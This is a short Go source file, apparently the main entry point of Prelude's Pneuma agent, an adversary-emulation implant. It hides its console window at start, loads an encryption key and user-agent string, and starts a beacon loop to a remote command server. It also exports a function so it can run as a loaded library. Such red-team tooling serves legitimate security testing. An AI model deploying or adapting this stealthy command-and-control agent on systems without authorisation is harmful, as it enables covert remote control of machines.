package main

// #include "library.h"
import "C"
import (
	"github.com/preludeorg/pneuma/sockets"
	"github.com/preludeorg/pneuma/util"
	"os"
	"strings"
)

var randomHash = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"

func init() {
	util.HideConsole()
}

func main() {
	agent := util.BuildAgentConfig()
	if *util.DebugMode {
		util.ShowConsole()
	}
	if !strings.Contains(agent.Address, ":") {
		util.DebugLogf("Your address is incorrect\n")
		os.Exit(1)
	}
	util.EncryptionKey = &agent.AESKey
	sockets.UA = &agent.Useragent
	util.DebugLogf("[%s] agent at PID %d using hash randomizing string %s", agent.Address, agent.Pid, randomHash)
	sockets.EventLoop(agent, agent.BuildBeacon())
}

//export RunAgent
func RunAgent()  {
	main()
}